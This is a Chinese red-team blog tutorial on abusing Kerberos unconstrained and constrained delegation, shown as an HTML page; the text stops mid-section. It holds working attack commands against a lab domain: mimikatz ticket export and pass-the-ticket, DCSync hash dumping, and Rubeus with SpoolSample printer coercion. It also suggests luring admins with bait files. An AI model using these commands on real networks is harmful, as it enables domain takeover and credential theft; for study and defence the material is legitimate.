@@ -1,0 +1,737 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>域委派利用 - 🐳毅种循环</title>
+<link rel="shortcut icon" href="https://redteamblog.icu/favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://redteamblog.icu/media/css/tailwind.css">
+<link rel="stylesheet" href="https://redteamblog.icu/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="域委派利用 - 🐳毅种循环 - Atom Feed" href="https://redteamblog.icu/atom.xml">
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-226932280-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'UA-226932280-1');
+  </script>
+    
+
+  <meta name="description" content="本篇文章主要是对域渗透中的委派利用手法进行总结，但是没有写基于资源的委派，等日后补吭。中间多多少少参考了一些网上的文章，文末给出参考链接。
+域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内..." />
+  <meta property="og:title" content="域委派利用 - 🐳毅种循环">
+  <meta property="og:description" content="本篇文章主要是对域渗透中的委派利用手法进行总结，但是没有写基于资源的委派，等日后补吭。中间多多少少参考了一些网上的文章，文末给出参考链接。
+域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://redteamblog.icu/post/域委派/" />
+  <meta property="og:image" content="https://api.ixiaowai.cn/api/api.php?=8">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="域委派利用 - 🐳毅种循环">
+  <meta name="twitter:description" content="本篇文章主要是对域渗透中的委派利用手法进行总结，但是没有写基于资源的委派，等日后补吭。中间多多少少参考了一些网上的文章，文末给出参考链接。
+域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://redteamblog.icu/post/域委派/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://redteamblog.icu/media/css/prism-vs-light.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://redteamblog.icu" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      🐳毅种循环
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          域委派利用
+        </h1>
+        
+          <img src="https://api.ixiaowai.cn/api/api.php?=8" alt="域委派利用" class="block w-full mb-8">
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2022-05-30 · 23 min read</div>
+          
+            <a href="https://redteamblog.icu/tag/McUKTZjbK/" class="text-gray-700 text-sm border-b-2 border-dotted border-gray-200 hover:border-gray-600 transition-all duration-100 inline-flex mr-2">
+              <i class="ri-hashtag"></i>
+              内网渗透
+            </a>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <p>本篇文章主要是对域渗透中的委派利用手法进行总结，但是没有写基于资源的委派，等日后补吭。中间多多少少参考了一些网上的文章，文末给出参考链接。</p>
+<p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是 <strong>主机账户</strong> ，另一种是 <strong>服务账户</strong> (域用户通过注册SPN也可以成为服务账号)。</p>
+<p>在域中只有服务账户和主机账户（即机器账户，一个普通域用户默认最多可以创建十个机器账户）才具有委派属性，也就说才能接受委派。<br>
+Kerberos委派主要分为三种：</p>
+<blockquote>
+<p><strong>非约束委派(Unconstrained Delegation)</strong><br>
+<strong>约束委派(Constrained Delegation)</strong><br>
+<strong>基于资源的约束委派(Resource-Based Constrained Delegation)</strong></p>
+</blockquote>
+<p>非约束委派和约束委派的流程，有兴趣的师傅可以去看看<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a" title="微软的手册">微软的手册</a>。<br>
+下面简单介绍下Kerberos的各类委派， <strong>如何配置</strong> ， <strong>如何发现</strong> ， <strong>实战场景中如何利用</strong> 。</p>
+<p>以下是本地操作环境：</p>
+<ul>
+<li>
+<p>域：<code>redteam.com</code></p>
+</li>
+<li>
+<p>域控：</p>
+<ul>
+<li>主域控：<code>DC</code> 系统：<code>Windows Server 2016</code> IP：<code>192.168.133.2</code></li>
+</ul>
+</li>
+<li>
+<p>域内主机：</p>
+<ul>
+<li><code>Win-2008</code> IP：<code>192.168.133.3</code> 本地管理员：<code>user1</code></li>
+<li><code>Win-2016</code> IP：<code>192.168.133.2</code> 本地管理员：<code>Administrator</code></li>
+</ul>
+</li>
+<li>
+<p>域用户：</p>
+<ul>
+<li>域管：<code>redteam\administrator</code></li>
+<li>普通域用户：<code>redteam\user1</code></li>
+<li>配置委派的域用户和服务账号：<code>redteam\test</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="委派前提">委派前提</h2>
+<p>需要被委派的账户不能被设置为敏感账号，如下图所示</p>
+<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/assets/clip-20220512161559-uv44zyq.png" alt="Image" title="Image" loading="lazy"></figure>
+<h2 id="非约束委派">非约束委派</h2>
+<h3 id="简介配置方法">简介&amp;&amp;配置方法</h3>
+<p>对于非约束性委派（Unconstrained Delegation），服务账号可以获取被委派用户的TGT，并将TGT缓存到lsass进程中，从而服务账号可以使用该TGT，模拟用户访问任何服务。</p>
+<p>非约束委派的设置需要<code>SeEnableDelegation</code>特权，该特权通常仅授予域管理员。配置了非约束委派的用户的<code>userAccountControl</code>属性有个FLAG位,<code>TRUSTED_FOR_DELEGATION</code>，对应是 0x80000 ，也就是 524288 。可以委派任何服务即为非约束委派。默认域内的域控均为非约束委派，可用于跨域（关于标志位值可参考：<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">decoding-ad-useraccountcontrol-value</a>）</p>
+<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/assets/clip_1-20220512161559-2mwtdvx.png" alt="Image" title="Image" loading="lazy"></figure>
+<p>打开&quot;Active Directory 用户和计算机-&gt;查看-&gt;高级功能&quot;，然后再查看用户属性即可看到（<code>adsiedit.msc</code>进ADSI编辑器也可以看到）</p>
+<p>这里值为WORKSTATION_TRUST_ACCOUNT和TRUSTED_FOR_DELEGATION，所以为0x81000</p>
+<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/assets/clip_2-20220512161559-2k6s2i5.png" alt="Image" title="Image" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://redteamblog.icu/post-images/assets/clip_3-20220512161559-biz93qq.png" alt="Image" title="Image" loading="lazy"></figure>
+<h3 id="非约束委派流程">非约束委派流程</h3>
+<p>非约束委派：当 <code>user</code> 访问 <code>service1</code> 时，如果 <code>service1</code> 的服务账号开启了 <code>unconstrained delegation</code>（非约束委派），则当 <code>user</code> 访问 <code>service1</code> 时会将 <code>user</code> 的 <code>TGT</code> 发送给 <code>service1</code> 并保存在内存中以备下次重用，然后 <code>service1</code> 就可以利用这张<code>TGT</code> 以 <code>user</code>的身份去访问域内的任何服务（任何服务是指<code>user</code>能访问的服务）</p>
+<p>https://www.cnblogs.com/zpchcbd/p/12939246.html</p>
+<figure data-type="image" tabindex="5"><img src="https://redteamblog.icu/post-images/assets/clip_9-20220512161559-ov7tgs0.png" alt="Image" title="Image" loading="lazy"></figure>
+<ol>
+<li>用户发送KRB_AS_REQ请求TGT（我们称为TGT1）</li>
+<li>KDC在KRB_AS_REP消息中返回TGT1</li>
+<li>用户再通过TGT1请求可转发的TGT（我们称为TGT2）</li>
+<li>KDC在KRB_TGS_REP消息中返回可转发的TGT2**（票据属性中带有可转发的标记Forwarded）**</li>
+<li>用户使用TGT1向TGS申请访问Service1的ST服务票据</li>
+<li>TGS返回给用户一个ST服务票据</li>
+<li>用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST服务票据、TGT2、TGT2的Session key**（这里TGT2和TGT2的Session key会被储存到Service1中，以便后续使用）**</li>
+<li>Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据ST2</li>
+<li>KDC在KRB_TGS_REP消息中返回Service2到Service1的票据ST2</li>
+<li>Service1以客户的名义用ST2发送KRB_AP_REQ请求</li>
+<li>Service2响应步骤10中Service1的请求</li>
+<li>Service1响应步骤7中用户的请求</li>
+<li>在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务</li>
+<li>KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他服务</li>
+</ol>
+<p>大致流程是：用户请求Service1，用户向KDC申请了访问Service1的ST服务票据和带有可转发标记的TGT票据，会一起发送给Service1，然后会被缓存到lsass中，后续Service就能使用那张可转发的TGT票据，以用户的身份申请其他任意服务的ST票据。对攻击者来说，如果使用DC或域管去访问Service1，那么就会在lsass内存中留下票据，就相当于直接拿下了域控。</p>
+<p>查找域中配置非约束委派的主机/服务账户</p>
+<h3 id="查找域中配置非约束委派的主机服务账户">查找域中配置非约束委派的主机/服务账户</h3>
+<h4 id="adfind可在域外查询">AdFind（可在域外查询）</h4>
+<p><strong>普通域用户执行</strong>：</p>
+<pre><code>查询域内配置非约束性委派的主机
+AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn
+
+查询域内配置非约束性委派的服务账号
+AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn
+
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://redteamblog.icu/post-images/assets/image-20220529144323-rdruzw0.png" alt="image.png" loading="lazy"></figure>
+<p>注：默认域控是配置了非约束性委派的，所以查出来显示具有两个配置了非约束委派的计算机。</p>
+<p><strong>域外可指定域普通用户账密进行查找</strong>：</p>
+<pre><code>#AdFind.exe -h 域控IP -u 域普通用户名 -up &quot;密码&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+
+#查询域中配置非约束委派的主机
+AdFind.exe -h 192.168.133.2 -u redteam\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+
+#查询域中配置非约束委派的服务账户
+AdFind.exe -h 192.168.133.2 -u redteam\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot;&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://redteamblog.icu/post-images/assets/image-20220529151204-4h5ijm4.png" alt="image.png" loading="lazy"></figure>
+<h4 id="sharpldapsearch">SharpLDAPSearch</h4>
+<p>下载地址：<a href="https://github.com/mitchmoser/SharpLDAPSearch">SharpLDAPSearch</a></p>
+<p>可以用ldap查询筛选，普通域用户下执行：</p>
+<pre><code>查找域中配置非约束委派的主机：
+SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; &quot;samaccountname&quot;
+
+查找域中配置非约束委派的用户：
+SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; &quot;samaccountname&quot;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://redteamblog.icu/post-images/assets/image-20220529151837-69wf6c9.png" alt="image.png" loading="lazy"></figure>
+<h4 id="使用powerviewps1">使用PowerView.ps1</h4>
+<p><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView-3.0 tips and tricks</a></p>
+<p>PowerView存在两个版本，有些功能只在dev版本中支持，但是我试了两个版本都不能直接查非约束委派的服务账户，所以这里用LDAP查询筛选</p>
+<p>普通域用户下执行：</p>
+<pre><code>#查询域中配置非约束委派的主机，下面俩一样
+powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerView.ps1;Get-NetComputer -Domain redteam.com -Unconstrained | select samaccountname}&quot;
+powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerView.ps1;Get-DomainComputer -Domain redteam.com -Unconstrained | select samaccountname}&quot;
+
+
+#查询域中配置非约束委派的服务账户
+powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerView.ps1;Get-DomainUser -Domain redteam.com -LDAPFilter userAccountControl:1.2.840.113556.1.4.803:=524288 | select name}&quot;
+</code></pre>
+<h4 id="sharpviewexe">SharpView.exe</h4>
+<p><a href="https://github.com/tevora-threat/SharpView/blob/master/Compiled/SharpView.exe" title="SharpView.exe">SharpView.exe</a></p>
+<p>用法和PowerView.ps1一样,他的查询服务账户好像还是有点问题，所以这里还是用LDAP查询</p>
+<pre><code>#查询域中配置非约束委派的主机
+SharpView.exe Get-NetComputer -Domain redteam.com -Unconstrained -Properties samaccountname
+
+#查询域中配置非约束委派的服务账户
+SharpView.exe Get-DomainUser -Domain redteam.com  -LDAPFilter userAccountControl:1.2.840.113556.1.4.803:=524288 -Properties samaccountname
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://redteamblog.icu/post-images/assets/image-20220529154432-aksshdy.png" alt="image.png" loading="lazy"></figure>
+<h3 id="非约束性委派攻击利用">非约束性委派攻击利用</h3>
+<p>https://y4er.com/post/kerberos-unconstrained-delegation/<br>
+https://www.freebuf.com/articles/web/303666.html</p>
+<p>用户 user 去访问服务 service，如果服务 service 的服务账户开启了非约束性委派，那么当用户 user 访问服务 service 的时候会将用户 user 的 TGT 发送给服务 service 并保存在内存中以备下次重用，所以服务 service 能够利用用户 user 的身份去访问用户 user 能够访问的任意服务。</p>
+<p>两种攻击方式，一种是诱使域管用户（相当于是域内钓鱼）来访问配置了非约束性委派的主机或服务，二是结合打印机漏洞让域管用户强制回连以缓存 TGT。</p>
+<h4 id="利用场景">利用场景</h4>
+<p>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。</p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit
+kerberos::ptt
+psexec64.exe \\DC2012.0ne.test -accepteula -s cmd
+</code></pre>
+<p>当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。详情可参考<a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5" title="daiker师傅的发起NTLM请求">daiker师傅的发起NTLM请求</a>。</p>
+<p>域管在域控上点击此文件夹是就会访问win7，导出域管的TGT，ptt，psexec域控。</p>
+<figure data-type="image" tabindex="10"><img src="https://redteamblog.icu/post-images/assets/image-20220529170642-wolxe69.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://redteamblog.icu/post-images/assets/image-20220529170619-20cdqnz.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://redteamblog.icu/post-images/assets/image-20220529170632-tap8uiw.png" alt="image.png" loading="lazy"></figure>
+<h4 id="利用前提">利用前提</h4>
+<ul>
+<li>需要非约束委派账户的主机本地管理员权限（需要从内存导出票据）</li>
+<li>查找非约束委派时需要一个域账户</li>
+</ul>
+<h4 id="模拟域管去访问非约束性委派主机">模拟域管去访问非约束性委派主机</h4>
+<p>1.以域管账户访问WIN-2008机器（主要是为了生成TGT）。</p>
+<p>模拟域管用户 <code>yg1</code>（只要是域管用户，不一定在域控）远程访问非约束性委派主机机 <code>Win-2008</code> ， <code>Win-2008</code> 已获得本地管理员权限。常见可利用钓鱼的连接方式可以是 MSSQL 或 IIS，这里演示域管用户 直接 IPC 连接 <code>Win-2008</code></p>
+<figure data-type="image" tabindex="13"><img src="https://redteamblog.icu/post-images/assets/image-20220529155924-c24zonf.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://redteamblog.icu/post-images/assets/image-20220529165500-sai7i39.png" alt="image.png" loading="lazy"></figure>
+<p>这时候 <code>Win-2008</code> 机器就已经有了域管 <code>yg1</code> 的 TGT 票据，可以用 mimikatz 导出lsass内存中所有票据。</p>
+<figure data-type="image" tabindex="15"><img src="https://redteamblog.icu/post-images/assets/image-20220529165517-4hekvdl.png" alt="image.png" loading="lazy"></figure>
+<p>3.使用mimikatz将票据导入内存中</p>
+<pre><code>#导入票据
+mimikatz.exe &quot;kerberos::ptt [0;7a739]-2-0-60a10000-yg1@krbtgt-REDTEAM.COM.kirbi&quot; &quot;exit&quot;
+#查看票据
+#也可mimikatz中查看：kerberos::list
+klist
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://redteamblog.icu/post-images/assets/image-20220529170219-fq2x1n0.png" alt="image.png" loading="lazy"></figure>
+<p>dcsync导出密码时也能获得访问域控LDAP的ST票据，可访问域控，一切正常：</p>
+<pre><code>mimikatz.exe &quot;lsadump::dcsync /domain:redteam.com /all /csv&quot; &quot;exit&quot; &gt; ntds.txt
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://redteamblog.icu/post-images/assets/image-20220529170427-6cbxqgd.png" alt="image.png" loading="lazy"></figure>
+<h3 id="非约束委派spooler利用">非约束委派+Spooler利用</h3>
+<p>在实战中，被动的非约束委派的利用需要和目标用户交互比较鸡肋。因此可以利用非约束委派+Spooler 打印机服务可以强制指定的主机进行连接。</p>
+<p>非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 <code>DC</code> 强制访问已控的具有本地管理员权限的非约束性委派机器 <code>Win-2008</code> ，从而拿到域管理员的 TGT，进而接管域控</p>
+<blockquote>
+<p>利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex)方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</p>
+</blockquote>
+<p>条件：目标机器（一般选域控）上需要开启Print Spooler服务（默认开启）</p>
+<figure data-type="image" tabindex="18"><img src="https://redteamblog.icu/post-images/assets/clip_23-20220512161559-ow0epcn.png" alt="Image" title="Image" loading="lazy"></figure>
+<p>https://www.cxyzjd.com/article/a3320315/106511098</p>
+<p>https://www.cnblogs.com/nice0e3/p/15875685.html#powerview</p>
+<p>首先利用<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>在 <code>Win-2008</code> 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 <code>DC</code> 的登录信息</p>
+<p>已编译的 Rubeus 下载：<a href="https://oss.zjun.info/file/Rubeus.exe">https://oss.zjun.info/file/Rubeus.exe</a></p>
+<p>版本：<a href="https://github.com/GhostPack/Rubeus/releases/tag/1.6.4">https://github.com/GhostPack/Rubeus/releases/tag/1.6.4</a></p>
+<p>1.使用Rubeus监听来自DC机器的4624登录日志**（需要本地管理员权限）**</p>
+<p>如果不能cmd不能最大化窗口，可以先运行wmic，然后再最大化窗口，之后在exit回到cmd下</p>
+<pre><code># /interval:1 设置监听间隔1秒
+# /filteruser 监听域控，注意后面有个$，如果不设置监听对象就监听所有的TGT
+Rubeus.exe monitor /interval:1 /filteruser:DC$
+</code></pre>
+<p>2.利用打印服务强制使DC访问WIN-7认证（可以不用管理员权限）</p>
+<p>再利用<a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p>
+<p>已编译的 SpoolSample 下载：<a href="https://oss.zjun.info/file/SpoolSample.exe">https://oss.zjun.info/file/SpoolSample.exe</a></p>
+<pre><code>SpoolSample.exe DC WIN-7
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://redteamblog.icu/post-images/assets/clip_19-20220512161559-wpqktzl.png" alt="Image" title="Image" loading="lazy"></figure>
+<p>WIN-7机器上接收到TGT票据</p>
+<figure data-type="image" tabindex="20"><img src="https://redteamblog.icu/post-images/assets/clip_20-20220512161559-no7yyqa.png" alt="Image" title="Image" loading="lazy"></figure>
+<p>3.导出&amp;注入票据</p>
+<p>如果使用mimikatz注入票据需要先进行一次转换</p>
+<pre><code>#使用mimikatz
+##PowerShell下执行
+[IO.File]::WriteAllBytes(&quot;.\ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;去掉换行后的Base64编码的票据&quot;))
+##PTT
+mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot; &quot;exit&quot;
+
+#使用Rubeus
+##可直接使用base64的TGT进行PTT
+Rubeus.exe ptt /ticket:去掉换行后的Base64编码的票据
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://redteamblog.icu/post-images/assets/clip_21-20220512161559-lutu818.png" alt="Image" title="Image" loading="lazy"></figure>
+<p><strong>注：这里获得的是域控机器账户的TGT票据</strong></p>
+<p>接下来解密 NTLM hash 后可以直接登录域控，解不开也可以利用 krbtgt 的 NTLM hash 用于做黄金票据权限维持，可以参考：<a href="https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html#cl-8">https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html#cl-8</a></p>
+<h2 id="约束委派">约束委派</h2>
+<h3 id="简介配置方法-2">简介&amp;配置方法</h3>
+<p>由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派（Constrained Delegation），还扩充了Kerberos协议，添加了S4u2self(Service for User to Self)和S4u2Proxy(Service for User to Proxy )子协议，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。配置了约束委派的账户的<code>msDS-AllowedToDelegateTo</code>属性会指定对哪个进行委派。**相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。**约束委派的设置同样需要<code>SeEnableDelegation</code>特权，该特权通常仅授予域管理员</p>
+<p>当服务账号或者主机被设置为约束性委派时，其<strong>userAccountControl属性</strong>包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<strong>msDS-AllowedToDelegateTo属性</strong>会包含被约束的服务。</p>
+<p>点击&quot;添加-&gt;选择委派的计算机-&gt;选择委派的服务&quot;即可新增。</p>
+<h3 id="小提示"><strong>小提示</strong></h3>
+<p><strong>如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意用户(如 domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）。</strong></p>
+<p>此外，我们不仅可以访问约束委派配置中用户可以模拟的服务， <strong>还可以访问使用与模拟帐户权限允许的任何服务。</strong> （因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync。</p>
+<blockquote>
+<p>如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。</p>
+</blockquote>
+<figure data-type="image" tabindex="22"><img src="https://redteamblog.icu/post-images/assets/image-20220529172932-hop7rue.png" alt="image.png" loading="lazy"></figure>
+<p>userAccountControl属性：</p>
+<figure data-type="image" tabindex="23"><img src="https://redteamblog.icu/post-images/assets/clip_5-20220512161559-ua2p8oc.png" alt="Image" title="Image" loading="lazy"></figure>
+<p>msDS-AllowedToDelegateTo属性：</p>
+<figure data-type="image" tabindex="24"><img src="https://redteamblog.icu/post-images/assets/image-20220529173145-xltqcsa.png" alt="image.png" loading="lazy"></figure>
+<p>注册个用户为服务账号方便后面复现（域管操作）</p>
+<pre><code>#创建个域用户
+net user SqlServer S123456@#!1 /domain /add
+#注册SPN，将SqlServer用户注册为服务账号
+setspn -U -A SQLServer/WIN2008.redteam.com:1433/MSSQL SqlServer
+#查找指定SqlServer用户注册的SPN
+setspn -L SqlServer
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://redteamblog.icu/post-images/assets/image-20220529173411-g205lum.png" alt="image.png" loading="lazy"></figure>
+<p>然后在域控中将SqlServer用户配置为约束性委派，方便演示直接配置为域控的CIFS协议</p>
+<figure data-type="image" tabindex="26"><img src="https://redteamblog.icu/post-images/assets/image-20220529173529-sv69n5d.png" alt="image.png" loading="lazy"></figure>
+<h3 id="约束委派流程">约束委派流程</h3>
+<figure data-type="image" tabindex="27"><img src="https://redteamblog.icu/post-images/assets/clip_22-20220512161559-oy71abz.png" alt="Image" title="Image" loading="lazy"></figure>
+<ol>
+<li>用户向Service1发起请求</li>
+<li>Service1通过S4U2self模拟用户向KDC请求获得Service1自身服务的可转发的ST服务票据</li>
+<li>KDC返回给Service1一个用于Service1自身服务的带有可转发标志的ST服务票据（这里假设称为ST1），并且Service1用这个ST1完成和用户的验证过程。</li>
+<li>Service1在步骤3使用模拟用户申请的ST1票据（带有Forwardable标记）完成与用户的验证，然后响应用户。</li>
+<li>用户再次向Service1发起请求。（这里有两点：Service1已经验证通过，并且有一个有效的带有Forwardable标记的TGT、Service1有从用户请求Service1的带有Forwardable标记的ST1）</li>
+<li>然后Service1通过S4U2proxy代表用户用ST1（带有Forwardable标记，在S4U2SELF阶段获得的TGS票据，会放在AddtionTicket字段中）向KDC请求一个用于认证Service2的ST（这里假设称为ST2）。通过ST1中的cname（client name）和crealm（client realm）字段标识用户。</li>
+<li>KDC在接收到步骤6中Service1的请求之后，进行验证，然后返回Service2的服务票据ST2（带有Forwardable标记）</li>
+<li>Service1代表用户使用ST2请求Service2。</li>
+<li>Service2响应Service1的请求。</li>
+<li>Service1响应用户的请求。</li>
+</ol>
+<p>从攻击者的角度来看就是如果攻击者控制了Service1的账号，并且Service1配置了到Service2服务的约束性委派。则攻击者可以利用Service1以administrator身份Service2。</p>
+<h3 id="查找域中配置约束委派的主机服务账户">查找域中配置约束委派的主机/服务账户</h3>
+<h4 id="adfind可在域外查询-2">AdFind（可在域外查询）</h4>
+<p><strong>普通域用户执行</strong>：</p>
+<pre><code>#查找域中配置约束委派的主机及服务
+AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+
+#查找域中配置约束委派的服务账户及服务
+AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://redteamblog.icu/post-images/assets/image-20220529173903-4psi6dx.png" alt="image.png" loading="lazy"></figure>
+<p><strong>域外可指定域普通用户账密进行查找</strong>：</p>
+<pre><code>#AdFind.exe -h 域控IP -u 域普通用户名 -up &quot;密码&quot; -b &quot;DC=xx,DC=xx&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+
+#查询域中配置约束委派的主机及服务
+AdFind.exe -h 192.168.133.2 -u redteam\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+
+#查询域中配置约束委派的服务账户及服务
+AdFind.exe -h 192.168.133.2 -u redteam\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+</code></pre>
+<figure data-type="image" tabindex="29"><img src="https://redteamblog.icu/post-images/assets/image-20220529174440-ukr7hy7.png" alt="image.png" loading="lazy"></figure>
+<p>配置了约束委派的机器</p>
+<figure data-type="image" tabindex="30"><img src="https://redteamblog.icu/post-images/assets/image-20220529174641-3aqk3f9.png" alt="image.png" loading="lazy"></figure>
+<p>这是配置了约束委派的服务账户。</p>
+<h4 id="sharpldapsearch-2">SharpLDAPSearch</h4>
+<p>下载地址：<a href="https://github.com/mitchmoser/SharpLDAPSearch">SharpLDAPSearch</a></p>
+<p>可以用ldap查询筛选，普通域用户下执行：</p>
+<pre><code class="language-mv">查找域中配置约束委派的主机
+SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; &quot;samaccountname&quot;
+
+查找域中配置约束委派的服务账户
